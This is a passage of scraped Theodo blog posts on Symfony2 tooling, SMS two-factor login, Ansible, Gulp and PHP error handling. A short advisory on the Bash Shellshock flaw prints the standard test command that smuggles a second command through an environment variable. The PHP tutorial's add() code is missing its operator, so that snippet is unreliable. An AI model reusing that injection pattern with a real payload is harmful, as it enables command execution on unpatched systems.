be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFlorian Rival\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThe goal of this article is to implement Symfony2 coding style in your PhpStorm editor. This will take you 5 minutes to configure your workspace.\nSymfony2 CodeSniffer installation\nYou can follow this steps\u00a0to install the Symfony2 standard CodeSniffer using\u00a0Composer.\n\nInstall phpcs:\ncomposer global require \"squizlabs/php_codesniffer=1.*\"\nYou can follow the PHP_CodeSniffer documentation to include it in your project dependencies.\nSimply add the composer bin directory to your PATH in your\u00a0~/.bash_profile\u00a0(or\u00a0~/.bashrc) by adding this line at the end of the file:\nPATH=$PATH:$HOME/.composer/vendor/bin\n\nBefore use phpcs command, you must open a new shell or execute this command :\nsource\u00a0~/.bash_profile\r\n\n\n\n\t\tUPDATE (27 Sept 2014): The OpenSky Standards I have used seems to be no longer available. I use this repo instead:\ngit@github.com:escapestudios/Symfony2-coding-standard.git\n\nCopy, symlink or check out the repo to a folder called Symfony2 inside the phpcs Standards directory:\ncd ~/.composer/vendor/squizlabs/php_codesniffer/CodeSniffer/Standards\r\ngit clone git@github.com:escapestudios/Symfony2-coding-standard.git Symfony2\r\n\n\nNow, your list of installed coding standard\u00a0should look like this:\nphpcs -i\r\nThe installed coding standards are PSR1, PSR2, PHPCS, Zend, MySource, Squiz, Symfony2 and PEAR\r\n\n\n\nPhpStorm configuration\n\n\nConfigure PhpStorm to use phpcs\nGo to Project Settings (PHP > Code Sniffer). Use this command to find phpcs path: which phpcs and put the result on the PHP Code Sniffer path field. You can test your configuration by clicking on the validate button. Then don\u2019t forget to click on the Apply button.\n        \n    \n\nConfigure PhpStorm inspection to use Symfony2 coding style\nGo to Project Settings (Inspection). Select PHP > PHP Code Sniffer validation inspection. In the right panel, you can choose your Coding standard. If Symfony2 does not appear in the drop-down list, click on the refresh button.\n        \n    \n\nOptional: Change the appearance of the inspection alerts\nReturn in the PHP Code Sniffer inspection menu. Click on the button with three dots to Edit severities. In the new window, click on the + button to add a new one. Choose a name, PHPCS for example. And apply just a black background. You can do the same for warning validation.\n\nEnjoy!\n\nA Pull Request return for Coding style error? Never!\nI usually use the opensky Symfony2 coding style but what is yours?\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJonathan Beurel\r\n  \t\t\t\r\n  \t\t\t\tJonathan Beurel - Web Developer. Twitter : @jonathanbeurel  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tToday a major security vulnerability has been found in GNU Bash. Bash is used by almost every Linux AND Unix systems.\nUbuntu and Mac OS are examples of OS using it. It\u2019s highly advised to update your OS.\nIf you want to know more about this, you should read this article.\nHow can I checked if my OS is vulnerable?\nThis command line can tell you if your OS is vulnerable.\nenv x='() { :;}; echo vulnerable' bash -c 'echo this is a test'\r\n\nIf you see \u201cvulnerable\u201d printed then you need to update the bash of your system.\n\n(Image from Robert Graham)\nHow to fix it?\nSome patches has been released so you can already update your Bash version to a safer one but they haven\u2019t fixed all the problems. You can check the current status of patches for Ubuntu here.\nOnce they will have fixed it, you will be able to update to a safe version of Bash.\nFor Ubuntu you just have to update your bash package:\nsudo apt-get update && sudo apt-get install bash\r\n\nMac users should have a look at this post\nSources:\n\nhttp://seclists.org/oss-sec/2014/q3/649\nhttp://askubuntu.com/questions/528101/what-is-the-cve-2014-6271-bash-vulnerability-and-how-do-i-fix-it\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tI attented the first London ansible meetup and I wanted to share the few things I\u2019ve learnt over there.\nTL;DR: Ansible is S-I-M-P-L-E that\u2019s why you should try using it.\nAnsible VS Puppet\nOne of the talk was about how to move from Puppet to Ansible. At Theodo we use both to provision our servers, as an active member of the Ansible team I was quite excited to discover some new pro Ansible arguments.\nSo Ali Asad Lotia explained why they moved from Puppet to Ansible in his company.\nTheir goals were mainly to simplify the process. This talk from Rich Hickey have convinced them about the importance of simplicity.\nOne of the main problem when using Puppet is the awful log error.\n\nWhy they have chosen Ansible?\nMinimal requirements\r\nSmall composable module set\r\nUse of ssh\r\nInfrastructure as configuration\r\n\nTheir Early Observations\nNo setup\r\nModule's name map to commands\r\nFailure on error \\o/\r\nEasier to read\r\nLower maintenance\r\n\nGreg\u2019s show\nThe last talk was a speech of the very sympathic and funny Ansible\u2019s community guy, Greg DeKoenigsberg with a long questions/answers session.\nMainly everybody was enjoying Ansible because of his simplicity. I have probably heard \u201cAnsible is so simple\u201d a hundred times (per minute).\nOne question was what is the main purpose of using Ansible? The answer from Greg is that Ansible is an automation tool so it can be used to automate anything not only the provisioning of a server.\nOne problem that my french neighbor had was that he can not check the compliance of his servers with Ansible as it can be done with Puppet. The answer from Greg was Ansible Tower!\nFinaly I\u2019ve asked a question about how the Ansible\u2019s team see Ansible Galaxy. For Greg, it\u2019s just a tool that centralized public Github Ansible\u2019s roles. It hasn\u2019t the goal to become\na composer/npm like service.\nThat\u2019s it for this meetup. You can check out my roles on Ansible Galaxy or those from my colleague Simon\nIf you have any questions, you can comment this article or poke me on twitter!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis blog post is written in French as the related video is in French.\n\u00a0\nLe 7 mars dernier, je pr\u00e9sentais \u00e0 la troupe des Theodoers une formation sur la \u00ab Pomodoro Technique\u00ae \u00bb, une technique de gestion efficace du temps, des impr\u00e9vus et des interruptions, m\u00e9thode que j\u2019utilise depuis maintenant 2 ans.\n\u00a0\nPour ceux qui souhaiteraient voir ou revoir cette formation, voici la vid\u00e9o. N\u2019h\u00e9sitez pas \u00e0 r\u00e9agir dans les commentaires de la page ou sur twitter (@guillaumededrie ou @theodo). Bon visionnage !\n\u00a0\n\n\u00a0\nLes slides de la pr\u00e9sentation sont \u00e9galement disponibles sur slides.com.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tGuillaume Dedrie\r\n  \t\t\t\r\n  \t\t\t\tGuillaume Dedrie - Web developper @Theodo. Loves new technologies.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nWe\u2019re happy to announce that Theodo has been confirmed as a bronze partner of dotScale 2014 !\ndotScale is a unique tech conference on Scalability, DevOps and Distributed Systems. The best hackers worldwide are invited to share their insights on stage! This year\u2019s edition will count the likes of Paul Mockapetris (inventor of the DNS), Jeremy Edberg (former Reddit Chief Architect and Site Reliability lead at Netflix), Mitchell Hashimoto (creator of Vagrant) or Fabien Potencier (creator of Symfony). Many others have been announced for a promising line-up !\nThe series of conferences will take place on May 19th in Paris. See you there !\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAntoine Haguenauer\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\n\nAbstract:\nThis article aims to help you build a two step authentication with sms for your Symfony2 application. It works like the google two step authentication. Here is the workflow of the achieved feature:\n\nthe user fills in a first login form with his login and password\nhe receives an SMS with a one time code\nhe fills a second login form with the code\nhe can check a \u201cI\u2019m on a trusted computer\u201d box so the second step will be skipped the next time he logs\nhe\u2019s logged\n\nWe will also add some development tools:\n\na parameter to fallback to mails (useful in dev or test environment)\na parameter to add a master phone number (like the \u2018delivery_address\u2019 parameter of swiftmailer)\na functional test\n\n\n\nRequirements\n\nI use Nexmo as my sms sending service.\na functional Symfony2 project with FOSuser installed (FOSuser is not compulsory but it helps a lot doing it right and through)\n\n\n\n1. Install bundles\nWe need to install two dependencies. The first, two-factor-bundle, will manage the second authentication step. The second, nexmo-bundle, will help us send sms easily.\n\n    # composer.json\r\n    {\r\n        # ...\r\n        \"require\": {\r\n                # ...\r\n            \"scheb/two-factor-bundle\": \"0.3.*\",\r\n            \"javihernandezgil/nexmo-bundle\": \"v0.9.*\"\r\n            # ...\r\n        },\r\n        # ...\r\n    }\n\nRegister them in AppKernel :\n\n    // app/AppKernel.php\r\n    // ...\r\n    class AppKernel extends Kernel\r\n    {\r\n        public function registerBundles()\r\n        {\r\n            $bundles = array(\r\n                // ...\r\n                new Scheb\\TwoFactorBundle\\SchebTwoFactorBundle(),\r\n                new Jhg\\NexmoBundle\\JhgNexmoBundle(),\r\n                // ...\r\n            );\r\n            // ...\r\n        }\r\n        // ...\r\n    }\n\nThen add some configuration:\n\n    # app/config/config.yml\r\n    # ...\r\n    jhg_nexmo:\r\n        api_key:    %nexmo_api_key%\r\n        api_secret: %nexmo_api_secret%\r\n        from_name:  %nexmo_from_name%\r\n    # ...\n\nnexmo_api_key, nexmo_api_secret, nexmo_from_name are parameters defined in app/config/parameters.yml. More details on these parameters are available in the two-factor bundle documentation and in the nexmo bundle documentation.\nWe will use two additional parameters along with them:\n\nnexmo_delivery_phone_number: if set, all sms messages will be sent to this phone number instead of being sent to their actual recipients. This is often useful when developing.\nnexmo_disable_delivery: if true, no sms will be delivered, mail will be send instead.\n\nEventually, our parameter file will look more or less like this:\n\n    # app/config/parameters.yml\r\n    ...\r\n    nexmo_api_key: \"12345abc\"\r\n    nexmo_api_secret: \"67890def\"\r\n    nexmo_from_name: MyCompany\r\n    nexmo_delivery_phone_number: \"+33123456789\"\r\n    nexmo_disable_delivery: false\n\nYou can now run composer to process the install.\n\n    composer install\n\n\n\n2. Extend FOSUserBundle\nThis is the optional part. All we need is a bundle which implements a user entity. Extending FOSUserBundle is a secure and clean way to do so.\nIf you use FOSUserBundle then create a new bundle (I called it \u201cAcmeUserBundle\u201d) which extends \u201cFOSUserBundle\u201d as explained in the Symfony2 documentation.\n\n\n3. Link nexmo with two-factor\n\nThe idea is to build a custom AuthCodeMailer which sends SMS :\n\n\n    // src/Acme/AcmeUserBundle/Services/SmsMailer.php\r\n    <?php\r\n        namespace Acme\\AcmeUserBundle\\Services;\r\n\r\n        use Acme\\AcmeUserBundle\\Entity\\User;\r\n        use Jhg\\NexmoBundle\\Managers\\SmsManager;\r\n        use Scheb\\TwoFactorBundle\\Model\\Email\\TwoFactorInterface;\r\n        use Scheb\\TwoFactorBundle\\Mailer\\AuthCodeMailerInterface;\r\n\r\n        class SmsMailer implements AuthCodeMailerInterface\r\n        {\r\n            private $smsSender;\r\n            private $senderMail;\r\n            private $mailer;\r\n            private $isSmsDisabled;\r\n            private $deliveryPhoneNumber;\r\n            private $senderAddress;\r\n\r\n            public function __construct(SmsManager $smsSender, \\Swift_Mailer $mailer, $isSmsDisabled, $deliveryPhoneNumber, $senderAddress)\r\n            {\r\n                $this->smsSender = $smsSender;\r\n                $this->mailer = $mailer;\r\n                $this->isSmsDisabled = $isSmsDisabled;\r\n                $this->deliveryPhoneNumber = $deliveryPhoneNumber;\r\n                $this->senderAddress = $senderAddress;\r\n            }\r\n\r\n            public function sendAuthCode(TwoFactorInterface $user)\r\n            {\r\n                $msg = \"Your validation code is \" . $user->getEmailAuthCode();\r\n\r\n                $fromName = \"SMSAuth\";\r\n\r\n                $this->sendSMS($user, $msg, $fromName);\r\n            }\r\n\r\n            public function sendSMS(User $user, $msg, $fromName)\r\n            {\r\n                // Fallback to mail if isSmsDisabled\r\n                if ($this->isSmsDisabled) {\r\n                    $this->sendMail($user->getEmail(), $msg, $fromName);\r\n                } else {\r\n\r\n                    if ($this->deliveryPhoneNumber !== null) {\r\n                        $number = $this->deliveryPhoneNumber;\r\n                    } else {\r\n                        $number = $user->getPhoneNumber();\r\n                    }\r\n\r\n                    $this->smsSender->sendText($number, $msg, $fromName);\r\n                }\r\n            }\r\n\r\n            public function sendMail($deliveryAddress, $msg, $fromName)\r\n            {\r\n                $message = \\Swift_Message::newInstance()\r\n                    ->setSubject(\"[SMS - \".$fromName.\"]\")\r\n                    ->setFrom($this->senderAddress)\r\n                    ->setTo($deliveryAddress);\r\n                $message->setBody($msg, 'text/html');\r\n\r\n                return $this->mailer->send($message);\r\n            }\r\n        }\n\nThen declare this as a service:\n\n    # src/Acme/AcmeUserBundle/Ressources/config/service.yml\r\n    parameters:\r\n        acme_user.sms_manager.class: Acme\\AcmeUserBundle\\Services\\SmsMailer\r\n\r\n    services:\r\n        doctor_dashboard.sms_mailer:\r\n            class: %acme_user.sms_manager.class%\r\n            arguments:\r\n                - @jhg_nexmo_sms\r\n                - @mailer\r\n                - %nexmo_disable_delivery%\r\n                - %nexmo_delivery_phone_number%\r\n                - %mailer_sender%\n\nConfigure the two factor bundle so it uses our sms mailer:\n\n    # app/config/config.yml\r\n    scheb_two_factor:\r\n        email:\r\n            enabled: true\r\n            mailer: acme_user.sms_mailer\r\n            sender_email: %mailer_sender%\r\n            template: AcmeUserBundle:Security:login_validation.html.twig\r\n            digits: 6\r\n\r\n        model_manager_name: ~\n\nAlso add the configuration for the trusted computer feature. This will allow users to check a \u201cI\u2019m on a trusted computer\u201d box so they could skip the second step the next time they log.\n\n    # app/config/config.yml\r\n    scheb_two_factor:\r\n        # ...\r\n        trusted_computer:\r\n            enabled: true\r\n            cookie_name: two_factor_trusted_computer\r\n            cookie_lifetime: 5184000 # 60 days\n\nIf you want to customize the form integration:\n\n    {# src/Acme/AcmeUserBundle/Resources/views/Security/login_validation.html.twig #}\r\n    {% extends \"FOSUserBundle::layout.html.twig\" %}\r\n\r\n    {% trans_default_domain 'FOSUserBundle' %}\r\n\r\n    {% block fos_user_content %}\r\n        {# the following is just the template proposed in the two-factor-bundle #}\r\n        <form class=\"form\" action=\"\" method=\"post\">\r\n            {% for flashMessage in app.session.flashbag.get(\"two_factor\") %}\r\n                <p class=\"error\">{{ flashMessage|trans }}</p>\r\n            {% endfor %}\r\n\r\n            <p class=\"label\"><label for=\"_auth_code\">{{ \"scheb_two_factor.auth_code\"|trans }}</label></p>\r\n            <p class=\"widget\"><input id=\"_auth_code\" type=\"text\" autocomplete=\"off\" name=\"_auth_code\" /></p>\r\n            {% if useTrustedOption %}<p class=\"widget\"><label for=\"_trusted\"><input id=\"_trusted\" type=\"checkbox\" name=\"_trusted\" /> {{ \"scheb_two_factor.trusted\"|trans }}</label></p>{% endif %}\r\n            <p class=\"submit\"><input type=\"submit\" value=\"{{ \"scheb_two_factor.login\"|trans }}\" /></p>\r\n\r\n            {# The logout link gives the user a way out if they can't complete the second step #}\r\n            <p class=\"cancel\"><a href=\"{{ path(\"_security_logout\") }}\">Cancel</a></p>\r\n        </form>\r\n    {% endblock fos_user_content %}\n\nAt last, implement a proper user for this to work:\n\n    // src/Acme/AcmeUserBundle/Entity/User.php\r\n    <?php\r\n\r\n    namespace Acme\\AcmeUserBundle\\Entity;\r\n\r\n    use FOS\\UserBundle\\Model\\User as BaseUser;\r\n    use Doctrine\\ORM\\Mapping as ORM;\r\n    use Scheb\\TwoFactorBundle\\Model\\Email\\TwoFactorInterface;\r\n    use Scheb\\TwoFactorBundle\\Model\\TrustedComputerInterface;\r\n\r\n    /**\r\n     * @ORM\\Table(name=\"acme_user\")\r\n     * @ORM\\Entity()\r\n     */\r\n    abstract class User extends BaseUser implements TwoFactorInterface, TrustedComputerInterface\r\n    {\r\n        /**\r\n         * @var integer\r\n         *\r\n         * @ORM\\Column(name=\"id\", type=\"integer\")\r\n         * @ORM\\Id\r\n         * @ORM\\GeneratedValue(strategy=\"AUTO\")\r\n         */\r\n        protected $id;\r\n\r\n        /**\r\n         * @var string\r\n         *\r\n         * @ORM\\Column(name=\"phone_number\", type=\"string\", length=255)\r\n         */\r\n        protected $phoneNumber;\r\n\r\n        /**\r\n         * @ORM\\Column(name=\"auth_code\", type=\"integer\", nullable=true)\r\n         */\r\n        private $authCode;\r\n\r\n        /**\r\n         * @ORM\\Column(name=\"trusted\", type=\"json_array\", nullable=true)\r\n         */\r\n        private $trusted;\r\n\r\n        public function setPhoneNumber($phoneNumber)\r\n        {\r\n            $this->phoneNumber = $phoneNumber;\r\n\r\n            return $this;\r\n        }\r\n\r\n        public function getPhoneNumber()\r\n        {\r\n            return $this->phoneNumber;\r\n        }\r\n\r\n        /*\r\n         * Implement the TwoFactorInterface\r\n         */\r\n\r\n        public function isEmailAuthEnabled() {\r\n            return true; // This can also be a persisted field but it is enabled by default for now\r\n        }\r\n\r\n        public function getEmailAuthCode() {\r\n            return $this->authCode;\r\n        }\r\n\r\n        public function setEmailAuthCode($authCode) {\r\n            $this->authCode = $authCode;\r\n        }\r\n\r\n        /*\r\n         * Implement the TrustedComputerInterface\r\n         */\r\n\r\n        public function addTrustedComputer($token, \\DateTime $validUntil)\r\n        {\r\n            $this->trusted[$token] = $validUntil->format(\"r\");\r\n        }\r\n\r\n        public function isTrustedComputer($token)\r\n        {\r\n            if (isset($this->trusted[$token])) {\r\n                $now = new \\DateTime();\r\n                $validUntil = new \\DateTime($this->trusted[$token]);\r\n                return $now < $validUntil;\r\n            }\r\n\r\n            return false;\r\n        }\r\n    }\n\n\n\n4. Test your work\n\nIn a behat scenario we want to do things like this:\n\n\n    Scenario: Login through login form\r\n        Given I am on \"/login\"\r\n        When I fill in \"username\" with \"admin\"\r\n        And I fill in \"password\" with \"admin\"\r\n        And I press \"_submit\"\r\n        Then I fill the form with the validation code\r\n        And I press \"_submit\"\r\n        Then the url should match \"/home\"\n\nHere is the custom behat step to do so:\n\n    // Features/Context/FeatureContext.php\r\n    /**\r\n     * @Then /^I fill the form with the validation code$/\r\n     */\r\n    public function iFillTheValidationCodeForm()\r\n    {\r\n        $profiler = $this->getContainer()->get('profiler');\r\n        $result = $profiler->find(null, null, 1, \"POST\", null, null);\r\n        $profile = $profiler->loadProfile($result[0]['token']);\r\n\r\n        $collector = $profile->getCollector('swiftmailer');\r\n        $code = $collector->getMessages()[0]->getBody();\r\n        return array(\r\n            new Step\\When('I fill in \"_auth_code\" with \"'.$code.'\"')\r\n        );\r\n    }\n\n\n\nResources\nHave a look at Christian Scheb Blog\nSpecial thanks to scheb and javihernandezgil for their fantastic work and availability.\n\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tRapha\u00ebl Dubigny\r\n  \t\t\t\r\n  \t\t\t\tRapha\u00ebl is an agile web developer at Theodo. He uses angular, nodejs and ansible every day.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tI\u2019m excited everyday I write front-end code with these amazing tools we now have to build client-side apps with pleasure.\nI liked JavaScript but typing so many brackets was killing my keyboard, then I discovered CoffeeScript.\nI was desperately trying to rationalize my copy and paste activity for selectors in CSS, but that was before LESS saved my life.\nI got lost every time in the verbose HTML markup of long web pages, and couldn\u2019t stand losing time forgetting closing tags, so Jade felt like a spring cleaning to me.\nAll these languages (and others like LiveScript, SCSS, etc.) are (unfortunately?) not natively read by browsers we develop for, adding to our test and release process an extra building step.\nIt\u2019s here where tools like Grunt or Brunch were needed, automating this \u201ccompilation\u201d.\nI personally used a lot Brunch as I considered it easier for common tasks in the stack I use, and I really appreciate his usability, and his out of the box behaviour.\nI loved it so much I wrote a kewl skeleton to start prototyping quickly with it.\nHowever, when I tried to use always more plugins to achieve more complex tasks, such as marking assets with a checksum, then adding them in a cache manifest file, I realized the limits of these tools, essentially because they\u2019re based on configuration, instead of code.\nAnd then, I discovered Gulp.\nAs developers, we love code. We\u2019d like to know what\u2019s happening deep down when we call some obscure function.\nGulp gets rid of this \u201cblack box\u201d approach and proposes a radically different philosophy to create your perfect front-end factory.\nI invite you to discover more about Gulp in this gitbook: (http://david.nowinsky.net/gulp-book).\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tDavid Nowinsky\r\n  \t\t\t\r\n  \t\t\t\tAgile web developer @theodo. Studied @TelecomPTech and @MasterPICX. Code, eat, rave, repeat.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tDuring application development, developers have to handle errors in the execution flow. PHP, among many other languages, allows you to do so but since I recently stumbled upon a really bad way to do it I thought that reminding the basics would not hurt.\n\nErrors or Exceptions\nPHP makes a distinction between \u201cerrors\u201d and \u201cexceptions\u201d. What\u2019s the difference? Since version 4, PHP provides errors to tell that something went wrong. It is possible to trigger errors and register an error handler but they are unrecoverable. Later, with the release of PHP 5, exceptions were introduced to be used in an object oriented way. Exceptions are catchable, unlike errors, meaning that you can catch them and try to recover or continue with the execution of the program.\n\n\nWhen does \u201cerror\u201d occur?\nDespite the introduction of exceptions, errors are still here and continue to appear (I don\u2019t mean that exceptions should replace errors)\u2026 Try something like this:\n<?php\r\n\r\n$foo = [bar];\r\necho $foo;\nNotice that quotes are missing in the array key: I should have written [\u2018bar\u2019]. This produces the following error:\nPHP Notice:  Array to string conversion[\u2026]\nCommon errors include:\n\n\nparsing errors: missing parenthesis, braces, semi-column\u2026\ntype conversion errors\nmemory allocation errors\n\n\nGenerally errors occur at the language level like when the syntax is wrong, some actions over variables are invalid.\n\n\nError reporting level\nDepending on the gravity of the error, your code can continue to run until the end or will stop. You can configure error reporting in PHP to ignore minor errors but I would recommend you to report as many errors as possible while developing. To configure the error reporting level you will use constants and bitwise operators which are not easy to apprehend. For example, to remove the notice from the previous piece of code you would do the following:\n<?php\r\n\r\nerror_reporting(E_ALL & ~E_NOTICE); // or simply error_reporting(~E_NOTICE);\r\n$foo = [\"bar\"];\r\necho $foo;\nIf you want to know what your current error reporting value is, use the error_reporting() function without any arguments.\n\n\nTrigger errors manually\nErrors can also be manually raised. For example, if you want to deprecate a function and warn the developer that this function will be removed in the next release, then you would do something like this:\n<?php\r\n\r\n/**\r\n * Returns the addition of to integer\r\n *\r\n * @deprecated This function will be removed in the release 0.2, you should use the add function instead\r\n * @param integer $a\r\n * @param integer $b\r\n * @return integer\r\n */\r\nfunction calculate($a, $b)\r\n{\r\n    trigger_error(\"This function will be removed in the release 0.2, you should use the add function instead\" ,E_USER_DEPRECATED);\r\n\r\n    return add($a, $b);\r\n}\r\n\r\n/**\r\n * @param integer $a\r\n * @param integer $b\r\n * @return integer\r\n */\r\nfunction add($a, $b)\r\n{\r\n    return $a  $b;\r\n}\nAs you can see the function add($a, $b) has been added, for more clarity I guess. So the calculate($a, $b) triggers an error E_DEPRECATED, which, with the default PHP configuration, does not stop the execution of the script, and calls the add() function.\nWhen the script calls the calculate function, the deprecation message is displayed:\nPHP Deprecated:  This function will be removed in the release 0.2, you should use the add function instead\n\n\nHandling errors\nBy default errors will be output right after it has been triggered or after the execution of the script. However, you can catch it and do things by defining and registering an error handler.\nset_error_handler(function ($errno, $errstr, $errfile, $errline, $errcontext) {\r\n    echo \"\\n Have a nice day\\n\";\r\n\r\n    exit(1);\r\n});\r\necho calculate(2, 3);\r\nexit(0);\nIn this example we reuse the previous calculate function that triggers a E_USER_DEPRECATED error. We set the closure as the error handler that will be called whenever an error occurs.\nAs you have already guessed this closure will print \u201cHave a nice day\u201d and exit with the code 1, meaning that the script ended with a problem.\nbenjamin@comp : ~/ $ php error-test.php\r\n\r\nHave a nice day\n\n\nIntroduction to exception\nAs mentioned before, exceptions have been introduced with PHP 5 to be used with the new way to program in PHP: object oriented (of course exceptions can also be used with a procedural way).\nExceptions are easy to use, you only have to instantiate a new Exception object with an explicit message, (optionally a code and a parent exception), and throw it:\nthrow new Exception(sprintf('Cannot find the file \"%s\".', $file));\nUnlike errors, you can catch a thrown exception and decide that your code can continue even if it failed somehow.\n// File exception.php\r\nclass FileReader\r\n{\r\n    /**\r\n     * @params string The file full path\r\n     * @return    string\r\n     * @throws   Exception\r\n     */\r\n    public function read($file)\r\n    {\r\n        $realFile = realpath($file);\r\n        if (!file_exists($realFile)) {\r\n            throw new Exception(sprintf('The file \"%s\" does not exist', $file));\r\n        }\r\n\r\n        return file_get_contents($realFile);\r\n    }\r\n }\nThis is a class that is able to read the content of a file. If the file does not exist it raises an exception telling so. Let\u2019s try to use it:\n// File exception.php\r\n$reader = new FileReader();\r\necho $reader->read('/foo/bar');\r\n\r\nexit(0):\nbenjamin@comp : ~/ $ php exception.php\r\n\r\nPHP Fatal error:  Uncaught exception 'Exception' with message 'The file \"/Users/benjamin/exception.php/foo\" does not exist' in /Users/benjamin/exception.php:64\r\nStack trace:\r\n#0 /Users/benjamin/exception.php(72): FileReader->read('/Users/benjamin...')\r\n#1 {main}\r\n  thrown in /Users/benjamin/exception.php on line 64\nPHP tells you that an exception has been raised but not caught and results in a fatal error that stops the execution of the script. To fix this you simply need to surround the call of the method by a try/catch statement:\n// File exception.php\r\n$reader = new FileReader();\r\n\r\ntry {\r\n    echo $reader->read('/foo/bar');\r\n} catch (Exception $e) {\r\n    echo $e->getMessage();\r\n    exit(1);\r\n}\r\nexit(0);\nThen when executing the exception.php script the exception message is echoed instead of the ugly message produced before.\n\n\nHandling exceptions\nSometimes, some exceptions could have not been caught by the library you use for your project causing a fatal error as seen previously. In this case you should set an exception handler to avoid problems when an exception has not been caught.\n// File exception.php\r\nset_exception_handler(function (Exception $e) {\r\n    echo $e->getMessage();\r\n    exit(1);\r\n});\r\n\r\n$reader = new FileReader();\r\necho $reader->read('/foo/bar');\r\nexit(0);\nThis will produce the same output than previously: it will echo the exception message and exit with code 1.\n\n\nConvert errors to exceptions\nAs I said before, errors can\u2019t be caught whereas exceptions can. But you can handle errors and convert them to exceptions thanks to the ErrorException class. To do so you need to register an error handler which converts errors into ErrorException. Lets do this with our previous calculation code:\nset_error_handler(function ($errno, $errstr, $errfile, $errline ,array $errcontex) {\r\n    throw new ErrorException($errstr, 0, $errno, $errfile, $errline);\r\n});\r\n\r\ntry {\r\n    $result = calculate(2, 3);\r\n} catch (ErrorException $e) {\r\n    echo sprintf(\"An error has been caught\\n %s\", $e->getMessage());\r\n    $result = 0;\r\n}\r\n\r\necho $result;\nThanks to the closure used as an handler, errors are now converted to an ErrorException that can be caught the way we saw previously and allows your code to behave accordingly to the exception. Your code will no longer stops because of an ugly error \n\n\nMulti catching and re-throwing exceptions\nAs there are different exception types you might want to differentiate the caught one to behave accordingly. You can chain the catch statement this way to tell your script to do something distinct:\ntry {\r\n    // do something that could raise an Exception or an ErrorException\r\n} catch (ErrorException $e) {\r\n    // do something when an ErrorException occurred\r\n} catch (Exception $e) {\r\n    // do something when an Exception 